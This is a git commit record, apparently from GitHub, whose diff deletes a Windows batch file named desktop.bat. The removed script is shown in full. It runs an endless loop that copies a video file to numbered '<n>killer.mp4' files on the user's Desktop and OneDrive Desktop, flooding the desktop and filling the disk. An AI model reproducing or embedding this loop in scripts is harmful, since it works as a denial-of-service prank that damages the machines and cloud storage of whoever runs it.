d4387350583bc49c6355ee6f9b2af396ae5b81ad
Hacker8P <163653407+Hacker8P@users.noreply.github.com>
2024-11-23 14:08:38 +0100

    Delete desktop.bat

--- desktop.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-set stone=0
-
-:loop
-set /a stone=%stone% + 1
-copy .\win.mp4 %userprofile%\Desktop\%stone%killer.mp4
-copy .\win.mp4 %onedrive%\Desktop\%stone%killer.mp4
-echo %stone%
-goto loop
